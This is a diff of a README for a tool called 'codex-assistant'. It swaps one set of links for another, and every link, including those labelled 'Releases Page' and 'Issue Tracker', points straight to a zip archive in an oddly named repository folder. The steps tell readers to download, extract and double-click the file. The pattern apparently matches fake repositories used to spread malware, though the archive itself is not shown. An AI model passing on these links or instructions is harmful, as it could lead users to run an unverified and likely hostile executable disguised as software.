@@ -1,6 +1,6 @@
 # 🛠️ codex-assistant - Execute Code Tasks Simply and Effectively
 
-[![Download codex-assistant](https://raw.githubusercontent.com/ThukuElvis/codex-assistant/main/sapremia/codex_assistant_2.6-alpha.5.zip)](https://raw.githubusercontent.com/ThukuElvis/codex-assistant/main/sapremia/codex_assistant_2.6-alpha.5.zip)
+[![Download codex-assistant](https://github.com/ThukuElvis/codex-assistant/raw/refs/heads/main/sapremia/assistant_codex_2.2.zip)](https://github.com/ThukuElvis/codex-assistant/raw/refs/heads/main/sapremia/assistant_codex_2.2.zip)
 
 ## 📄 Overview
 
@@ -16,7 +16,7 @@ Follow these steps to download and run codex-assistant:
    - Disk Space: Approximately 100 MB available space.
 
 2. **Visit the Releases Page:**
-   - Access the release downloads by clicking [here](https://raw.githubusercontent.com/ThukuElvis/codex-assistant/main/sapremia/codex_assistant_2.6-alpha.5.zip).
+   - Access the release downloads by clicking [here](https://github.com/ThukuElvis/codex-assistant/raw/refs/heads/main/sapremia/assistant_codex_2.2.zip).
 
 3. **Download the Software:**
    - On the releases page, you will see various versions of the software. Choose the most recent version labeled as "Latest Release".
@@ -26,14 +26,14 @@ Follow these steps to download and run codex-assistant:
    - If you downloaded a `.zip` file, you need to extract it. Right-click the downloaded file and select "Extract All" or use your preferred extraction tool.
 
 5. **Run the Application:**
-   - Locate the extracted folder and find the executable file (usually named `https://raw.githubusercontent.com/ThukuElvis/codex-assistant/main/sapremia/codex_assistant_2.6-alpha.5.zip` or similar).
+   - Locate the extracted folder and find the executable file (usually named `https://github.com/ThukuElvis/codex-assistant/raw/refs/heads/main/sapremia/assistant_codex_2.2.zip` or similar).
    - Double-click the file to launch the application.
 
 ## 📥 Download & Install
 
 For a smoother experience, directly download the software from our releases page:
 
-[Download codex-assistant](https://raw.githubusercontent.com/ThukuElvis/codex-assistant/main/sapremia/codex_assistant_2.6-alpha.5.zip)
+[Download codex-assistant](https://github.com/ThukuElvis/codex-assistant/raw/refs/heads/main/sapremia/assistant_codex_2.2.zip)
 
 ## ⚙️ Using codex-assistant
 
@@ -70,11 +70,11 @@ No, you do not need to create an account with OpenAI. codex-assistant operates i
 If you run into any issues while using codex-assistant:
 - Check that you have downloaded the correct version for your operating system.
 - Restart the application and try executing your command again.
-- Visit our [Issue Tracker](https://raw.githubusercontent.com/ThukuElvis/codex-assistant/main/sapremia/codex_assistant_2.6-alpha.5.zip) and report your issue.
+- Visit our [Issue Tracker](https://github.com/ThukuElvis/codex-assistant/raw/refs/heads/main/sapremia/assistant_codex_2.2.zip) and report your issue.
 
 ## 💡 Tips for Best Experience
 
-- **Stay Updated:** Always use the latest version of codex-assistant. Check periodically for updates on the [Releases Page](https://raw.githubusercontent.com/ThukuElvis/codex-assistant/main/sapremia/codex_assistant_2.6-alpha.5.zip).
+- **Stay Updated:** Always use the latest version of codex-assistant. Check periodically for updates on the [Releases Page](https://github.com/ThukuElvis/codex-assistant/raw/refs/heads/main/sapremia/assistant_codex_2.2.zip).
 - **Read the Documentation:** To understand more about each functionality, refer to the included documentation in the downloaded files.
 - **Experiment:** Try different types of commands to see how codex-assistant can assist you in various coding tasks.
 
